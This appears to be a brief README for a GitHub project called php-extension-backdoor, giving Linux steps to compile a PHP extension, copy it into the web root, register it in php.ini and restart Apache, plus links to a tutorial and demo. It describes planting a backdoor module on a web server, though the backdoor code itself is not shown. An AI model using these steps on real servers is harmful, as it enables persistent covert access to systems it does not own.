author:akamajoris

url:https://github.com/akamajoris/php-extension-backdoor

Windows: http://stackoff.ru/pishem-rasshirenie-bekdor-dlya-php/

Linux:
sudo apt-get install php5-dev
phpize && ./configure && make

chmod  xxx.so
copy xxx.so to /var/www

edit php.ini
add extension=/var/www/xxx.so
restart apache

test success!!  ^_^

demo:http://drops.wooyun.org/tips/3003